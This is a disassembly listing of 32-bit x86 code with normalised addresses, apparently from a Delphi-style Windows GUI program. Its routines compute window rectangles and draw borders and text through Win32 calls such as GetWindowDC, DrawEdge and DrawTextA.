mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_445020
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_444c6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_441698
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_4453e2
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_441698
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_444f9c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4453f9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_445020
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43f1d0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_445438
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_440054
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43dab4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_445480
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440274
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4454b0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_441200
xor ecx ecx
push ebp
push sub_4455df
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_441698
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4455e6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_441208
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44165c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4455e6
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40348c
jmp r-xdata
sub_44567c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f334
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f334
sub_4456c0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43f334
sub_445730
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4457c0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_445a26
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cf48
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_4301bc
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4309e8
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_445a68
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43dc90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_442254
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43f334
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_4404f8
sub_445ad4
push ebx
push esi
mov esi edx
call sub_4553f0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406998
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f334
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406998
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f334
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_445b38
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44261c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_445b70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_445b68
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445bb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d24c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43cd28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_445c0c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43d324
test bl bl
jle r-xdata
xor eax eax
call sub_43b31c
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_445c4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d39c
xor eax eax
push ebp
push sub_445ce7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d800
xor eax eax
push ebp
push sub_445cc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ccb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d800
retn
sub_445cf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446630
mov edx 0x80ffff
mov eax esi
call sub_43e2ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d67c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d030
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_445d64
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4417f4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bcc0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44178c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_445dd0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445e26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e2d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ReleaseDC
retn
sub_445e34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445ecd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c728
mov eax ebx
call sub_4404a0
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43e14c
mov eax [ ebp - 0x14 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ed4
lea eax [ ebp - 0x14 ]
call sub_403fe0
retn
sub_445edc
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
